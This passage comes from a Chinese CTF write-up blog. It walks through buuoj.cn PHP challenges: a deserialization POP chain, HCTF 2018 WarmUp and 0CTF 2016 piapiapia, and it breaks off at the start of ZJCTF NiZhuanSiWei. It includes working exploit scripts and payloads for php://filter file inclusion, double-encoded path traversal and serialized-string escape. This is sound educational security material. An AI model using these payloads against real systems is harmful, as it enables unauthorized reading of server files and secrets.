class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>__construct()</code>把p转换成数组，读取不可访问属性的值时调用<code>__get()</code> ，把p以函数的形式返回。</p>\n<p>解题：<br>我们看到Modifier类中有文件包含，且提示flag在flag.php中，因此我们的目的是能够读到<code>include(flag.php)</code>，虽然过滤了几个协议，但filter没被过滤。<br>从反序列化进程开始分析，首先反序列化之后会触发<code>__wakeup()</code>，接着<code>__wakeup()</code>又会直接触发<code>__tostring()</code>，从而访问str的成员source，这时如果我们让str等于Test类对象，由于Test中没有source，就会触发<code>__get()</code>，将<code>$p</code>以函数的形式返回，而我们再让<code>$p</code>等于Modifier的话，<code>__invoke()</code>方法就会触发，从而自动调用append函数包含flag.php</p>\n<p>exp：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Modifier</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">protected</span>  $var=<span class=\"string\">\"php://filter/read=convert.base64-encode/resource=flag.php\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $p;\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Show</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $source;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;str = <span class=\"keyword\">new</span> Test();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> Show();<span class=\"comment\">//此时source(show)-&gt;str</span></span><br><span class=\"line\">$a-&gt;source = <span class=\"keyword\">new</span> Show();<span class=\"comment\">//source(show)-&gt;str之后触发__tostring然后访问source(test)触发__get</span></span><br><span class=\"line\">$a-&gt;source-&gt;str-&gt;p = <span class=\"keyword\">new</span> Modifier();<span class=\"comment\">//__get返回的p触发__invoke</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($a);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//O:4:\"Show\":2:&#123;s:6:\"source\";O:4:\"Show\":2:&#123;s:6:\"source\";N;s:3:\"str\";O:4:\"Test\":1:&#123;s:1:\"p\";O:8:\"Modifier\":1:&#123;s:6:\" * var\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";&#125;&#125;&#125;s:3:\"str\";O:4:\"Test\":1:&#123;s:1:\"p\";N;&#125;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>由于var是protected类型，所以payload中需要用%00把它的位数补齐，或者直接最后url编码输出<br>最后传入pop得到base64编码，解码即得flag<br><img src=\"https://img-blog.csdnimg.cn/20200617213137619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2020061721323182.png\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["serialize","代码审计"]},{"title":"HCTF2018——WarmUp","url":"/2020/05/25/buu1%E2%80%94%E2%80%94%5BHCTF%202018%5DWarmUp/","content":"<p>开个坑吧，把buu上的审计题好好做一遍<br>平台：buuoj.cn</p>\n<h5 id=\"1-HCTF-2018-WarmUp\"><a href=\"#1-HCTF-2018-WarmUp\" class=\"headerlink\" title=\"1.[HCTF 2018]WarmUp\"></a>1.[HCTF 2018]WarmUp</h5><p>buu上solves最多的一道题。<br>开局一张滑稽图，F12查看源码，发现提示：source.php<br>查看source.php，源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">emmm</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span><span class=\"params\">(&amp;$page)</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            $whitelist = [<span class=\"string\">\"source\"</span>=&gt;<span class=\"string\">\"source.php\"</span>,<span class=\"string\">\"hint\"</span>=&gt;<span class=\"string\">\"hint.php\"</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (! <span class=\"keyword\">isset</span>($page) || !is_string($page)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">\"you can't see it\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">                $page,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos($page . <span class=\"string\">'?'</span>, <span class=\"string\">'?'</span>)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            $_page = urldecode($page);</span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">                $_page,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos($_page . <span class=\"string\">'?'</span>, <span class=\"string\">'?'</span>)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"you can't see it\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! <span class=\"keyword\">empty</span>($_REQUEST[<span class=\"string\">'file'</span>])</span><br><span class=\"line\">        &amp;&amp; is_string($_REQUEST[<span class=\"string\">'file'</span>])</span><br><span class=\"line\">        &amp;&amp; emmm::checkFile($_REQUEST[<span class=\"string\">'file'</span>])</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span> $_REQUEST[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"</span>;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>有个hint.php，打开看下：<br><img src=\"https://img-blog.csdnimg.cn/20200525120724951.png\" alt=\"在这里插入图片描述\"><br>得知flag在ffffllllaaaagggg内，先留着。<br>开始分析代码：<br>先看这个类：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">emmm</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        public static function checkFile(&amp;$page)//将传入的参数赋给$page</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $whitelist = [<span class=\"string\">\"source\"</span>=&gt;<span class=\"string\">\"source.php\"</span>,<span class=\"string\">\"hint\"</span>=&gt;<span class=\"string\">\"hint.php\"</span>];<span class=\"comment\">//声明白名单$whitelist</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (! <span class=\"keyword\">isset</span>($page) || !is_string($page)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//判断$page是否不存在或者不是字符串</span></span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">\"you can't see it\"</span>；</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//判断$page是否在白名单内</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">            <span class=\"comment\">//如果$page里有\"?\"，截取$page中'?'前面部分，若无则截取整个$page</span></span><br><span class=\"line\">                $page,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos($page .<span class=\"string\">'?'</span>, <span class=\"string\">'?'</span>)<span class=\"comment\">//mb_strpos()：返回要查找的字符串在另一个字符串中首次出现的位置</span></span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//判断截取之后的$_page是否在白名单内</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            $_page = urldecode($page);<span class=\"comment\">//url解码$page</span></span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">            <span class=\"comment\">//再截</span></span><br><span class=\"line\">                $_page,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos($_page . <span class=\"string\">'?'</span>, <span class=\"string\">'?'</span>)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//再判断白名单</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"you can't see it\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>再看第二部分：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (! <span class=\"keyword\">empty</span>($_REQUEST[<span class=\"string\">'file'</span>])<span class=\"comment\">//file不为空</span></span><br><span class=\"line\">       &amp;&amp; is_string($_REQUEST[<span class=\"string\">'file'</span>])<span class=\"comment\">//file是字符串</span></span><br><span class=\"line\">       &amp;&amp; emmm::checkFile($_REQUEST[<span class=\"string\">'file'</span>])<span class=\"comment\">//通过emmm类的checkfile检测</span></span><br><span class=\"line\">   ) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">include</span> $_REQUEST[<span class=\"string\">'file'</span>];<span class=\"comment\">//包含该文件</span></span><br><span class=\"line\">       <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">   &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">       <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"</span>;</span><br><span class=\"line\">       <span class=\"comment\">//否则滑稽</span></span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>分析一下，前面已经提示了flag在ffffllllaaaagggg内，再结合第二部分的流程，因此如果我们能让ffffllllaaaagggg通过checkfile的检测，那么我们就可以包含这个文件从而得到flag，所以重点在checkfile上。<br>来看checkfile，要通过checkfile就要使返回值为true，也就是最后截断后的_page返回为true，_page经过三次白名单检测，两次”?”截断，和一次url解码，一层一层来。<br>第一次白名单：source.php或者index.php都行，以source.php为例<br>第一次截断加上截断后第二次白名单检测：source.php?，截断后source.php在白名单内检测通过<br>利用file包含：source.php?file=(包含文件)<br>第二次截断加白名单：source.php?file=source.php?，截断后source.php在白名单内检测通过<br>把”?”url编码，这里有个隐藏点，PHP中_GET、_POST、_REQUEST这类函数在提取参数值时会URL解码一次，所以我们应当对”?”进行两次编码，source.php?file=source.php%253F<br>然后把ffffllllaaaagggg写上去，source.php?file=source.php%253F../../../../ffffllllaaaagggg，这里的../我一开始以为是试出来的，后来参考<a href=\"https://www.cnblogs.com/yesec/p/12635274.html\" target=\"_blank\" rel=\"noopener\">这位师傅</a>得知这里是php在解析时将 source.php%253F/ 视作了一个文件夹，因此再加上var/www/html三级目录，自然就是四次../<br>因此最后得到payload为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">/source.php?file=source.php%<span class=\"number\">253</span>F/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>\n<p>得到flag：<br><img src=\"https://img-blog.csdnimg.cn/20200525141630758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>不知道为啥这题sloves最多，师傅们戏称的buu劝退题很真实。</p>\n<p>复习：</p>\n<p>发现了几个没想到的地方</p>\n<ol>\n<li><p>为什么必须要加？而不直接包含flag文件</p>\n</li>\n<li><p>为什么%253f可以，直接用?也可以</p>\n</li>\n</ol>\n<p>首先是加<code>？</code>的原因，这里是我对in_array这个函数没理解清楚，它并不是模糊匹配，它的目标参数必须是完全和数组中的某个元素相同，才能返回true，而我们不加<code>?</code>的payload：<code>/source.php?file=source.php/../../../../ffffllllaaaagggg</code>，被截取之后是一整个字符串，也就相当于一个元素，肯定是不在$whitelist里的，这样，所有的if都没有返回true，直接读到最后返回false了</p>\n<p>然后是%253为什么可以成功包含文件，他经过浏览器第一次读取url之后变成<code>/source.php?file=source.php%3F/../../../../ffffllllaaaagggg</code>不是也检测不到<code>？</code>吗，那样不就也不能通过in_array吗，是的，第一个确实不能通过，所以<strong>它没有返回值</strong>，注意，它也没返回false，那么函数checkfile依旧是没有退出的，那么他就会继续往下读，从<code>/source.php?file=source.php%3F/../../../../ffffllllaaaagggg</code>开始传入浏览器，经过url又一次解码，截断函数就读到了<code>?</code>，从而返回了true，而根据判断条件，只要checkfile返回true，就算通过，这里的重点就是并不是说必须要满足每一个if，即使前面的没有满足，只要它没返回false，后面的if再来返回true，那么它整体还是true的。</p>\n<p>所以我们知道类似的直接传%3f也是可以的。</p>\n<p>而直接用<code>?</code>就不难理解了，这就相当于解码没有对他没有意义，第一次截断和第二次截断都是source.php，在白名单内通过都返回true</p>\n<p>这样才算是把这道题搞懂了，感谢小白师傅提出的问题，让我重新思考了这道题，还是提醒了我以后做题还是要仔细通透，不能马虎了事。</p>\n","categories":["buu刷题"],"tags":["代码审计"]},{"title":"0CTF2016——piapiapia","url":"/2020/05/29/buu5%E2%80%94%E2%80%94%5B0CTF%202016%5Dpiapiapia/","content":"<p>平台：buuoj.cn<br>打开靶机如下：<br><img src=\"https://img-blog.csdnimg.cn/20200529114742390.png\" alt=\"在这里插入图片描述\"><br>弱密码，sql乱试一波没反应，注册个账号进去之后让我们更新信息<br><img src=\"https://img-blog.csdnimg.cn/20200529135044826.png\" alt=\"在这里插入图片描述\"><br>提交跳转到profile.php<br><img src=\"https://img-blog.csdnimg.cn/20200529135145952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\">)扫一下网站目录。(我们在做题扫目录的时候经常会遇见429的情况，这时候就需要调整一下扫描参数，比如dirsearch添加个延时参数，这样就大大提高了扫描效率)</p>\n<p>最后结果如下：<br><img src=\"https://img-blog.csdnimg.cn/20200529120508948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>还是有好多没扫出来（逃）<br>源码泄露，下载下来解压如下：<br><img src=\"https://img-blog.csdnimg.cn/20200529120644467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>在config.php里看见了flag，但不可读<br><img src=\"https://img-blog.csdnimg.cn/2020052913554473.png\" alt=\"在这里插入图片描述\"><br>profile.php里有反序列化<br><img src=\"https://img-blog.csdnimg.cn/20200529135655165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>后面我们看到了$photo变量有经过file_get_contents处理，这里出现了利用点，如果我们把$profile[‘photo’]替换为config.php，那么我们就能读取config.php里的flag<br>在源码里整理一下逻辑结构<br>register-&gt;login-&gt;update-&gt;profile<br>登录和注册不看，从update开始<img src=\"https://img-blog.csdnimg.cn/20200529142525697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\">对各个参数进行一些过滤，然后序列化$profile，跟进update_profile<br><img src=\"https://img-blog.csdnimg.cn/2020052914231416.png\" alt=\"在这里插入图片描述\"><br>跟进过滤<br><img src=\"https://img-blog.csdnimg.cn/20200529142403913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这里正则把一些操纵函数替换成hacker</p>\n<h4 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h4><p>前面已经知道，我们的目的是要读取config.php从而得到flag，读取config.php需要替换$profile[‘photo’]，也就是要让config,php成为序列化的一部分，可以利用的是反序列化字符串逃逸</p>\n<blockquote>\n<p>在后端中，反序列化是以”;}结束的，因此如果我们把”;}带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前结束而后面的内容就会被丢弃</p>\n</blockquote>\n<p>由<br><img src=\"https://img-blog.csdnimg.cn/20200529144614865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以得知他序列化后的字符串应为:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">a:<span class=\"number\">4</span>:&#123;s:<span class=\"number\">5</span>:<span class=\"string\">\"phone\"</span>;s:<span class=\"number\">11</span>:<span class=\"string\">\"12345678901\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"email\"</span>;s:<span class=\"number\">12</span>:<span class=\"string\">\"12345@qq.com\"</span>;s:<span class=\"number\">8</span>:<span class=\"string\">\"nickname\"</span>;s:<span class=\"number\">3</span>:<span class=\"string\">\"123\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"photo\"</span>;s:<span class=\"number\">39</span>:<span class=\"string\">\"upload/07cc694b9b3fc636710fa08b6922c42b\"</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200529163306313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>把config.php从nickname塞进去就变成了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">a:<span class=\"number\">4</span>:&#123;s:<span class=\"number\">5</span>:<span class=\"string\">\"phone\"</span>;s:<span class=\"number\">11</span>:<span class=\"string\">\"12345678901\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"email\"</span>;s:<span class=\"number\">12</span>:<span class=\"string\">\"12345@qq.com\"</span>;s:<span class=\"number\">8</span>:<span class=\"string\">\"nickname\"</span>;s:<span class=\"number\">3</span>:<span class=\"string\">\"123\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"photo\"</span>;s:<span class=\"number\">10</span>:<span class=\"string\">\"config.php\"</span>;&#125;s:<span class=\"number\">39</span>:<span class=\"string\">\"upload/07cc694b9b3fc636710fa08b6922c42b\"</span>;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200529163235797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>虽然给他反序列化之后结果photo的部分是config,php，但这样是读不到config.php的，因为更新profile的时候根本没地方插进去，因此就需要从nickname入手把这些数据悄悄带进去<br>首先解决nickname的长度限制问题<br><img src=\"https://img-blog.csdnimg.cn/20200529150902174.png\" alt=\"在这里插入图片描述\"><br>直接将nickname变成数组就可突破限制</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">a:<span class=\"number\">4</span>:&#123;s:<span class=\"number\">5</span>:<span class=\"string\">\"phone\"</span>;s:<span class=\"number\">11</span>:<span class=\"string\">\"12345678901\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"email\"</span>;s:<span class=\"number\">12</span>:<span class=\"string\">\"12345@qq.com\"</span>;s:<span class=\"number\">8</span>:<span class=\"string\">\"nickname\"</span>;a:<span class=\"number\">1</span>:&#123;i:<span class=\"number\">0</span>;s:<span class=\"number\">3</span>:<span class=\"string\">\"123\"</span>;&#125;s:<span class=\"number\">5</span>:<span class=\"string\">\"photo\"</span>;s:<span class=\"number\">10</span>:<span class=\"string\">\"config.php\"</span>;&#125;s:<span class=\"number\">39</span>:<span class=\"string\">\"upload/07cc694b9b3fc636710fa08b6922c42b\"</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200529163201857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>现在我们考虑怎么让”;}s:5:”photo”;s:10:”config.php”;}这34个字符逃逸出来<br>前面提到Fliter会将where一类的函数替换成hacker，也就是说where在被正则替换后，其本身的长度会加1，如果我们构造34个where</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">34</span>*<span class=\"number\">5</span> = <span class=\"number\">170</span>\t<span class=\"number\">170</span>+<span class=\"number\">34</span>个字符=<span class=\"number\">204</span>=len(<span class=\"string\">''</span>hacker<span class=\"string\">\")*34</span></span><br></pre></td></tr></table></figure>\n<p>那么在传入后端之后hacker的长度就会将我们目标逃逸字符挤掉<br>过程如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">传入:</span><br><span class=\"line\">s:<span class=\"number\">8</span>:<span class=\"string\">\"nickname\"</span>;a:<span class=\"number\">1</span>:&#123;i:<span class=\"number\">0</span>;s:<span class=\"number\">204</span>:<span class=\"string\">\"34*where\"</span>;&#125;s:<span class=\"number\">5</span>:<span class=\"string\">\"photo\"</span>;s:<span class=\"number\">10</span>:<span class=\"string\">\"config.php\"</span>;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">此时<span class=\"number\">34</span>*where<span class=\"string\">\";&#125;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;都作为nickname存在</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">正则替换:</span></span><br><span class=\"line\"><span class=\"string\">s:8:\"</span>nickname<span class=\"string\">\";a:1:&#123;i:0;s:204:\"</span><span class=\"number\">34</span>*hacker<span class=\"string\">\";&#125;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">因为s只有204个字符,所以读取第34个hacker之后就停止,34个字符\"</span>;&#125;s:<span class=\"number\">5</span>:<span class=\"string\">\"photo\"</span>;s:<span class=\"number\">10</span>:<span class=\"string\">\"config.php\"</span>;&#125;不再包含在nickname内</span><br></pre></td></tr></table></figure>\n<p>既然从nickname逃逸出，<code>&quot;};</code>将前面的nickname数组闭合之后，剩下的<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>就会被当作photo的部分了，至于后面的upload，由于被后面<code>&quot;;}</code>结束反序列化，也就被丢弃，这样就实现了config.php的读取</p>\n<h4 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>登陆注册之后用burp抓个包将nickname改为数组,构造内容<br><img src=\"https://img-blog.csdnimg.cn/20200529163924397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>访问profile后在源码里发现base字符串<br><img src=\"https://img-blog.csdnimg.cn/20200529164040579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>解码即得flag<br><img src=\"https://img-blog.csdnimg.cn/20200529164103853.png\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["代码审计","反序列化字符串逃逸"]},{"title":"ZJCTF2019——NiZhuanSiWei","url":"/2020/05/28/buu4%E2%80%94%E2%80%94%5BZJCTF%202019%5DNiZhuanSiWei/","content":"<p>平台：buuoj.cn<br>打开靶机源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$text = $_GET[<span class=\"string\">\"text\"</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the zjctf\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;h1&gt;\"</span>.file_get_contents($text,<span class=\"string\">'r'</span>).<span class=\"string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Not now!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>get传入三个变量。<br>两个if判断，第一个判断text变量是否存在并判断”welcome to the 